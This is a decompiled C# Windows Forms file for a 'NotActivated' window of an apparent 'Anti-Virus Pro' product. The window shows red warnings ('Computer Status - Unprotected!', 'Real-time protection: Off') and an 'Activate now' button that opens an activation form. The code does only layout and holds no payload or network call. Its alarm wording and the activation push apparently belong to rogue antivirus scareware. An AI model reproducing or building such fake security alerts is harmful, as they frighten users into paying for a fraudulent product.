using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

public sealed class NotActivated : Form
{
	private IContainer icontainer_0;

	private Class7 panel1;

	private Label lblCompStatus;

	private Class7 panel2;

	private Button button2;

	private PictureBox pictureBox1;

	private Class7 panel3;

	private Label label1;

	private PictureBox pictureBox4;

	private PictureBox pictureBox3;

	private Label label12;

	private Label label11;

	private Label label10;

	private Label label9;

	private PictureBox pictureBox2;

	private Label label4;

	private Label label3;

	private Label label2;

	public NotActivated()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_0328: Unknown result type (might be due to invalid IL or missing references)
		//IL_0332: Expected O, but got Unknown
		//IL_05c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cc: Expected O, but got Unknown
		//IL_0733: Unknown result type (might be due to invalid IL or missing references)
		//IL_073d: Expected O, but got Unknown
		//IL_07ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d4: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(NotActivated));
		panel1 = new Class7();
		lblCompStatus = new Label();
		panel2 = new Class7();
		button2 = new Button();
		pictureBox1 = new PictureBox();
		panel3 = new Class7();
		label1 = new Label();
		pictureBox4 = new PictureBox();
		pictureBox3 = new PictureBox();
		label12 = new Label();
		label11 = new Label();
		label10 = new Label();
		label9 = new Label();
		pictureBox2 = new PictureBox();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		((Control)panel1).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel3).SuspendLayout();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackgroundImage((Image)componentResourceManager.GetObject("panel1.BackgroundImage"));
		((Control)panel1).get_Controls().Add((Control)(object)lblCompStatus);
		((Control)panel1).set_Dock((DockStyle)1);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(679, 35));
		((Control)panel1).set_TabIndex(0);
		((Control)lblCompStatus).set_AutoSize(true);
		((Control)lblCompStatus).set_BackColor(Color.Transparent);
		((Control)lblCompStatus).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompStatus).set_ForeColor(Color.White);
		((Control)lblCompStatus).set_Location(new Point(29, 9));
		((Control)lblCompStatus).set_Name("lblCompStatus");
		((Control)lblCompStatus).set_Size(new Size(222, 16));
		((Control)lblCompStatus).set_TabIndex(10);
		((Control)lblCompStatus).set_Text("Computer Status - Unprotected! \r\n");
		((Control)panel2).get_Controls().Add((Control)(object)button2);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		panel2.method_7(270f);
		panel2.method_1(Color.FromArgb(200, 201, 201));
		panel2.method_3(Color.White);
		((Control)panel2).set_Location(new Point(0, 35));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(679, 264));
		((Control)panel2).set_TabIndex(3);
		((Control)button2).set_BackColor(Color.Transparent);
		((Control)button2).set_BackgroundImage((Image)(object)Class3.smethod_7());
		((Control)button2).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.Transparent);
		((Control)button2).set_Location(new Point(448, 195));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(219, 49));
		((Control)button2).set_TabIndex(18);
		((Control)button2).set_Text("Activate now");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)(object)Class3.smethod_18());
		((Control)pictureBox1).set_Location(new Point(480, 8));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(165, 179));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(19);
		pictureBox1.set_TabStop(false);
		((Control)panel3).get_Controls().Add((Control)(object)label1);
		((Control)panel3).get_Controls().Add((Control)(object)pictureBox4);
		((Control)panel3).get_Controls().Add((Control)(object)pictureBox3);
		((Control)panel3).get_Controls().Add((Control)(object)label12);
		((Control)panel3).get_Controls().Add((Control)(object)label11);
		((Control)panel3).get_Controls().Add((Control)(object)label10);
		((Control)panel3).get_Controls().Add((Control)(object)label9);
		((Control)panel3).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel3).get_Controls().Add((Control)(object)label4);
		((Control)panel3).get_Controls().Add((Control)(object)label3);
		((Control)panel3).get_Controls().Add((Control)(object)label2);
		((Control)panel3).set_Location(new Point(8, 55));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(429, 224));
		((Control)panel3).set_TabIndex(20);
		panel3.method_5(Color.FromArgb(207, 207, 207));
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Tahoma", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.FromArgb(28, 71, 126));
		((Control)label1).set_Location(new Point(21, 11));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(222, 19));
		((Control)label1).set_TabIndex(29);
		((Control)label1).set_Text("Key Features and Benefits");
		pictureBox4.set_Image((Image)(object)Class3.smethod_22());
		((Control)pictureBox4).set_Location(new Point(25, 120));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(25, 19));
		pictureBox4.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox4.set_TabIndex(28);
		pictureBox4.set_TabStop(false);
		pictureBox3.set_Image((Image)(object)Class3.smethod_22());
		((Control)pictureBox3).set_Location(new Point(25, 84));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(25, 19));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox3.set_TabIndex(27);
		pictureBox3.set_TabStop(false);
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_ForeColor(Color.Red);
		((Control)label12).set_Location(new Point(252, 190));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(155, 13));
		((Control)label12).set_TabIndex(26);
		((Control)label12).set_Text("Last updated a month ago");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(Color.Red);
		((Control)label11).set_Location(new Point(252, 170));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(23, 13));
		((Control)label11).set_TabIndex(25);
		((Control)label11).set_Text("Off");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Location(new Point(14, 190));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(83, 13));
		((Control)label10).set_TabIndex(24);
		((Control)label10).set_Text("Virus definitions:");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Location(new Point(14, 170));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(104, 13));
		((Control)label9).set_TabIndex(23);
		((Control)label9).set_Text("Real-time protection:");
		pictureBox2.set_Image((Image)(object)Class3.smethod_22());
		((Control)pictureBox2).set_Location(new Point(25, 48));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(25, 19));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox2.set_TabIndex(22);
		pictureBox2.set_TabStop(false);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_ForeColor(SystemColors.ControlText);
		((Control)label4).set_Location(new Point(56, 120));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(211, 13));
		((Control)label4).set_TabIndex(21);
		((Control)label4).set_Text("Protection for your digital identity at all times");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(SystemColors.ControlText);
		((Control)label3).set_Location(new Point(56, 84));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(249, 13));
		((Control)label3).set_TabIndex(20);
		((Control)label3).set_Text("Scanning of websites and emails for malicious code");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_ForeColor(SystemColors.ControlText);
		((Control)label2).set_Location(new Point(56, 48));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(237, 13));
		((Control)label2).set_TabIndex(19);
		((Control)label2).set_Text("Real-time protection against viruses and spyware");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(679, 299));
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("NotActivated");
		((Control)this).set_Text("Your copy of Anti-Virus Pro is not activated");
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		ActivateForm activateForm = new ActivateForm();
		((Control)activateForm).Show();
	}
}
